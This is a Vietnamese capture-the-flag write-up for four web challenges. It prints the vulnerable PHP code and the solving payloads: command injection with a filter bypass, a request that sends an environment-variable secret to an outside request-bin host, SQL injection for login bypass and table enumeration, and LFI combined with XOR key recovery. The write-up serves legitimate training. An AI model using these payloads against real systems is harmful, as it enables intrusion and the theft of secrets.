# MiniCTF writeups

## Web

Làm web trên tàu, cảm giác thật chóng mặt đau đầu 😥😥

### Head1

```Dockerfile
FROM php:apache

COPY ./flag.txt /
RUN mv /flag.txt /flag_$(openssl rand -hex 10)

COPY ./index.php /var/www/html/
```

```php
<?php

if (strpos($_SERVER['REQUEST_URI'], '_')) {
    die("no no no");
}

if (isset($_GET['input_data'])) {
    $output = shell_exec("curl --head " . $_POST['input_data']);
    echo $output;
}

show_source(__FILE__);
```

Xem sơ qua source thì flag nằm ở `/`. Nhìn vào source php, ý tưởng ở đây là command injection vào `input_data` gửi từ POST request.
- Để server thực thi lệnh shell_exec thì ta cần gửi `input_data` ở cả dạng `GET` và `POST`. Tuy nhiên server có filter ký tự `_`. Do đó ta có thể nghĩ đến url encode ký tự `_` để bypass.
- Không biết tên flag nhưng ta có thể sử dụng `cat /flag*`.

Kết quả:
![](/W1CTF/minictf/images/head1.png)

### Head2

```Dockerfile
services:
  web:
    build: .
    ports:
      - '8083:80'
    environment:
      - FLAG=W1{fake_flag}
```
```php
<?php

if (isset($_GET['input_data'])) {
	$output = shell_exec("curl --head " . $_GET['input_data']);
	// echo $output;
}

show_source(__FILE__);
```

Bài này flag được set ở biến env FLAG, do đó ta sẽ  dùng lệnh `echo $FLAG` để in ra.

Để lấy flag, ta có thể cho nó curl về request bin với tham số là giá trị của flag như sau:
`
http://45.122.249.68:20019/?input_data=https://eov5gzrmq5p9826.m.pipedream.net?flag=$(echo $FLAG)
`

Kết quả:
![](/W1CTF/minictf/images/head2.png)

### dejavu

Chall này tương tự như chall training.

Đầu tiên ta cần đăng nhập vào với tài khoản `admin` để có thêm chức năng của `news.php`. Code login:
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['username'])) 
    {
        $username = $_POST['username'];
        $password = $_POST['password'];  
        $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
        $result = pg_query($connection, $query);  
        if (pg_num_rows($result) == 1) 
        {
            $_SESSION['loggedin'] = true;
            $_SESSION['username'] = $username;
            header('Location: news.php');
        } 
        else 
        {
            header('Location: index.php');
        }
    }
```

Từ code login, ta có thể dễ dàng đăng nhập với:
- username là `admin`
- password là `'or 1=1 limit 1-- -`

Tiếp theo là bước sqli news.php:
```php
$newsQuery = "SELECT name, content FROM news";
if (isset($_GET['name'])) $newsQuery .= " WHERE name LIKE '%" . $_GET['name'] . "%'";

$newsResult = pg_query($connection, $newsQuery);

if (preg_match("/users/i", $newsQuery)) die("No hack 🐳");

if (pg_num_rows($newsResult) > 0) 
{
    while ($row = pg_fetch_assoc($newsResult)) 
    {
        echo "Name: " . $row['name'] . "<br>";
        echo "Content: " . $row['content'] . "<br><br>";
    }
} 
```
```sql
CREATE TABLE secret
(
    flag VARCHAR(50)
);

CREATE TABLE news
(
    name VARCHAR(100),
    content VARCHAR(1000)
);

-- this table is unknown, not sure about table name, column name, ...
CREATE TABLE REDACTED_table
(
    REDACTED_column1 VARCHAR(100),
    REDACTED_column2 VARCHAR(100),
    REDACTED_column3 VARCHAR(100)
);

INSERT INTO users VALUES ('guest', '123456'), ('admin', <part3>);

INSERT INTO news VALUES ('Science news', '1 + 1 = 3'), ('More science news', '88 + 22 is not equal to 100 🐳');

INSERT INTO secret VALUES (<part1>);

INSERT INTO REDACTED_table VALUES ( REDACTED ... <part2> ... REDACTED);
```

Ba part của flag như trên, ta sẽ đi qua từng part:
#### Part1:
Ta có thể sqli như sau:

`http://45.122.249.68:20017/news.php?name=guest'+union+select+null,flag+from+secret--+-`

![](/W1CTF/minictf/images/dejavu1.png)

#### Part2:
Phần này chỉ cần lấy tên table, và cột table là tìm được flag:
- Lấy table_name: 
    - Payload: `http://45.122.249.68:20017/news.php?name=guest'+union+select+null,table_name from information_schema.tables-- -`
    - Tìm một xíu ta được table là `secret_8489498498112318_8489498498112318`
- Lấy column_name của table trên: 
    - Payload: `http://45.122.249.68:20017/news.php?name=guest'+union+select+null,column_name from information_schema.columns where table_name='secret_8489498498112318_8489498498112318'-- -`
    - Ta có được `column_name` chứa flag là `flag_5959595959408498_5959595959408498`

- Lấy flag:
    - Payload: `http://45.122.249.68:20017/news.php?name=guest'+union+select+null,flag_5959595959408498_5959595959408498 from secret_8489498498112318_8489498498112318-- -`

Ta có được part2 là `_part2`:

![](/W1CTF/minictf/images/dejavu2.png)

#### Part3:

Part3 của flag nằm ở table `users` nhưng ta bị filter từ khóa `users` trong lệnh query, do đó ta có thể nghĩ ngay đến hex encode trong mysql:
- `U&"\0075sers"` sẽ tương ứng với `"users"`, và trong mysql thì ta có thể thêm dấu `"` và tên table để query.

- Payload: `http://45.122.249.68:20017/news.php?name=guest'+union+select+null,password from U&"\0075sers" where username='admin'-- -`

![](/W1CTF/minictf/images/dejavu3.png)

Full flag: `W1_part1_part2_part③_ⓓⓔⓙⓐⓥⓤ_福🐳😁}`

### Simple Stuff

Câu này mình cũng có hướng giải quyết nhưng tiếc là không đủ thời gian 😥, và cũng một phần là `skill issue` 🤡

Đầu tiên là file xem báo:
```php
<?php session_start();?>
<html>
<head>
    <title>Báo cũ: fake news, báo lá cãi, ...</title>
    <meta charset="utf-8"/>
    <link rel="stylesheet" href="/assets/css/style.css">
</head>
<body>
    <h1>Today's news</h1>
    <?php 
        error_reporting(0);
        putenv("IS_PRODUCTION=true");

        if (isset($_GET["id"])) {
            if (preg_match("/flag|pecl|pearcmd|log/i", $_GET["id"])) {
                die("id contains weird stuff, don't do that again");
            }
            include("articles/news".$_GET["id"]);
        } else {
            echo file_get_contents("articles/news1");
        }
        $next = @$_GET["id"] ? $_GET["id"] + 1 : 1;
        $next = ($next > 3 || $next < 1) ? 1 : $next;
    ?>
    <a href="<?php echo "/?id=".$next;?>"><button>Next ➣</button></a>
</body>
</html>
```

Server sử dụng hàm `include` để in ra các bài báo trong articles. Với việc sử dụng hàm `include`, ta có thể nghĩ ngay đến LFI.

Tuy nhiên phía server đã filter hết các payload có thể RCE, mình không biết là còn payload nào có thể không 🧐. 

Cho nên theo ý đồ của bài này là làm cách nào để trigger file ở `/admin/index.php`.

Ta có thể LFI như sau:

![](/W1CTF/minictf/images/simple-stuff-1.png)

Như vậy là đã gọi đến được `/admin/index.php`, ta xem tiếp file này thực hiện những gì:

```php
<?php 
error_reporting(0);
session_start();

function do_xor($str_1, $str_2) {
    if (strlen($str_1) < strlen($str_2)) {      
        return null;
    }

    if (strlen($str_1) >= strlen($str_2)) {      
        $str_2 = str_pad($str_2, strlen($str_1) - strlen($str_2), "=");
    }
    
    $str_1 = str_split($str_1);
    $str_2 = str_split($str_2);
    $length = count($str_1);
    $result = "";

    for($i = 0; $i < $length; $i++) {
        $result .= strval(ord($str_1[$i]) ^ ord($str_2[$i]))."-";
    }

    return $result;
}

if (!getenv("IS_PRODUCTION")) {
    die("this page is not ready yet! Come back later...");
}

if ($_POST["username"] && $_POST["password"]) {
    $username = $_POST["username"];
    $password = $_POST["password"];
    $db_connection = new mysqli("mydb", "root", "root", "ctf");
    
    $result = $db_connection->execute_query("SELECT username, password from users WHERE username = '$username' LIMIT 1;")->fetch_row();

    if ($result && $result[1] == md5($password)) {        
        $key = file_get_contents("/flag.txt");
        $id = do_xor($result[0], $key);
        $_SESSION["id"] = $id;
        echo "login success!";
    }
    
} 


?>

<html>
<head>
    <title>Báo cũ: fake news, báo lá cãi, ...</title>
    <meta charset="utf-8"/>
    <link rel="stylesheet" href="/assets/css/style.css">
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <form action="/admin/index.php" method="POST">
            <div>
                <label>Username:</label>
                <input type="text" name="username">
            </div>
            <div>
                <label>Username:</label>
                <input type="password" name="password">
            </div>
            <input type="submit">
        </form>
    </div>
</body>
</html>
```

Đầu tiên nó thực hiện check biến environment `IS_PRODUCTION`:
```php
if (!getenv("IS_PRODUCTION")) {
    die("this page is not ready yet! Come back later...");
}
```

Nó chỉ đơn giản là yêu cầu chúng ta LFI rồi mới đến file `/admin/index.php` chứ không cho mở trực tiếp.

Tiếp theo là với form đăng nhập:
- Sau khi chúng ta gửi yêu cầu đăng nhập lên nó sẽ thực hiện check username và md5(password) với tài khoản admin được lưu trong db:
```sql
INSERT INTO `users` (`id`, `username`, `password`, `bio`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', 'hi, i am groot.');
```
- `21232f297a57a5a743894a0e4a801fc3` đem đi crack thì ra `admin`.
- Nếu đúng thì thực hiện hàm `do_xor` flag với username sau đó lưu vào biến id của phiên làm việc (session id) hiện tại.

Hàm `include` trong PHP được sử dụng để nạp và thực thi nội dung của một file PHP vào một file PHP khác. Do đó nếu ta có thể nhúng một file PHP vào thì ta có thể thao tác với nó. Do đó người ta mới có thể sử dụng LFI kết hợp với việc chèn vào var-log mã `<?php ?>` các kiểu rồi include vào để RCE hoặc something else...

Vậy nên mình có thể gửi một post request để login như sau:
![](/W1CTF/minictf/images/simple-stuff-2.png)

Bây giờ ta có thể lấy được giá trị của id ở trong `/tmp/sess_<your-session-id>`:

![](/W1CTF/minictf/images/simple-stuff-3.png)

Giá trị là `N`, hmm suy nghĩ một lúc mình mới chợt nhớ ra trước khi lưu vào file thì nó serialize đối tượng session rồi mới lưu vào file cứng, N ở đây là null. 🤯 Alzheimer's disease.

```php
function do_xor($str_1, $str_2) {
    if (strlen($str_1) < strlen($str_2)) {      
        return null;
    }

    if (strlen($str_1) >= strlen($str_2)) {      
        $str_2 = str_pad($str_2, strlen($str_1) - strlen($str_2), "=");
    }
    
    $str_1 = str_split($str_1);
    $str_2 = str_split($str_2);
    $length = count($str_1);
    $result = "";

    for($i = 0; $i < $length; $i++) {
        $result .= strval(ord($str_1[$i]) ^ ord($str_2[$i]))."-";
    }

    return $result;
}
```

Null đó xuất phát từ hàm do_xor, nếu len("admin") < len(flag) thì nó sẽ trả về null. Và flag thì chắc chắn không thể <= 6 ký tự được. Do đó ta cần làm sao cho `str_1` đủ dài để có thể lấy được giá trị xor với flag.

Tác giả đã gài gắn vào đây thêm lỗ hổng sqli:
```php
$result = $db_connection->execute_query("SELECT username, password from users WHERE username = '$username' LIMIT 1;")->fetch_row();
```

Tới đây mình không đủ thời gian để làm tiếp, nhưng mà bây giờ thì đủ 😓.

![](/W1CTF/minictf/images/simple-stuff-4.png)

Login thành công rồi, giờ lấy giá trị của id:
![](/W1CTF/minictf/images/simple-stuff-5.png)

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

```php
id|s:203:"54-80-26-18-80-12-17-13-4-62-18-21-20-7-7-62-22-9-4-15-62-17-20-21-62-21-14-6-4-21-9-4-19-62-8-18-62-18-81-62-2-81-81-13-62-9-4-9-4-9-4-9-4-9-4-9-4-62-9-4-9-4-9-4-9-4-9-4-9-4-28-107-97-97-97-97-97-97-97-";
```

Bây giờ tới công đoạn reverse hàm do_xor 🧐:
- Đầu tiên nó pad cho str_2 cho đến khi 2 str_1 và str_2 dài bằng nhau.
- Sau đó nó xor từng ký tự của hai string.

Khá đơn giản, ta có thể xor ngược lại như sau:
```python
f='54-80-26-18-80-12-17-13-4-62-18-21-20-7-7-62-22-9-4-15-62-17-20-21-62-21-14-6-4-21-9-4-19-62-8-18-62-18-81-62-2-81-81-13-62-9-4-9-4-9-4-9-4-9-4-9-4-62-9-4-9-4-9-4-9-4-9-4-9-4-28-107-97-97-97-97-97-97-97'
f1 = f.split('-')
result = ''
for i in f1:
    result += chr(int(i)^ord('a'))
print(result)
```

Kết quả:

![](/W1CTF/minictf/images/simple-stuff-6.png)
